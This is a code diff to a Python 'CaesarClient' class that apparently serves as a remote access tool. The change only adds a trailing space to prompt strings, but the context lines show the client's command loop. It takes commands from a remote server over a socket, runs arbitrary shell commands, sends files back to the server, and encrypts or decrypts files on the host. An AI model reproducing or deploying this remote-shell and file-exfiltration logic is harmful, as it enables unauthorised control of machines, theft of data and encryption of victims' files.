@@ -75,7 +75,7 @@ class CaesarClient:
         while True:
             cmd = self.sock.recv(65536).decode()
             if cmd == " ":
-                self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode()) #send current working directory back to server
+                self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode()) #send current working directory back to server
 
             elif cmd[:2] == 'cd':
                 #change directory
@@ -86,12 +86,12 @@ class CaesarClient:
                     result = result.decode()
 
                     if "The system cannot find the path specified." in result:
-                        self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                        self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                     else:
-                        self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                        self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
                 except(FileNotFoundError, IOError):
-                    self.sock.send(f"[-]Directory does not exist!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                    self.sock.send(f"[-]Directory does not exist!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
             elif "get" in cmd:
                 self.generalFeatures.send_client_file(self.sock, cmd[4:])
@@ -120,14 +120,14 @@ class CaesarClient:
                 if len(cmd) == 3:
                     self.generalFeatures.encrypt_file(self.sock, "".join(cmd[1]), "".join(cmd[2]))
                 elif len(cmd) > 3 or len(cmd) < 3:
-                    self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                    self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
             elif "decrypt" in cmd:
                 cmd = cmd.split(" ", 2)
                 if len(cmd) == 3:
                     self.generalFeatures.decrypt_file(self.sock, "".join(cmd[1]), "".join(cmd[2]))
                 elif len(cmd) > 3 or len(cmd) < 3:
-                    self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
+                    self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
             elif cmd == "conn check":
                 pass
@@ -142,9 +142,9 @@ class CaesarClient:
 
                     terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
                     terminal_output = terminal_output.decode()
-                    output = f"{str(terminal_output)} \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:"
+                    output = f"{str(terminal_output)} \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: "
                     self.sock.send(output.encode())
 
                 except Exception as e:
-                    output = f"{str(e)} \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:"
+                    output = f"{str(e)} \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: "
                     self.sock.send(output.encode())
